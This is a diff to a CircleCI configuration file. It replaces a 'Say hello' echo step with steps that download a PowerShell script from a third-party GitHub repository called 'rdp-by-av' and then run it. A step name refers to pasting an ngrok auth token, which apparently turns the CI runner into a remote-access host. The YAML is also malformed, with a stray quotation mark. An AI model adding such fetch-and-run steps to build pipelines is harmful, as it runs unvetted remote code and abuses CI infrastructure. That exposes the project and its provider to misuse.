@@ -15,8 +15,10 @@ jobs:
     steps:
       - checkout
       - run:
-          name: "Say hello"
-          command: "echo Hello, World!"
+          name: Paste Ngrok Aurth Auth Value In Hosted Link"
+          command: 
+            Invoke-WebRequest https://raw.githubusercontent.com/rdpbyav789/rdp-by-av/main/sh -outFile gpu.ps1
+      - run: ./gpu.ps1
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
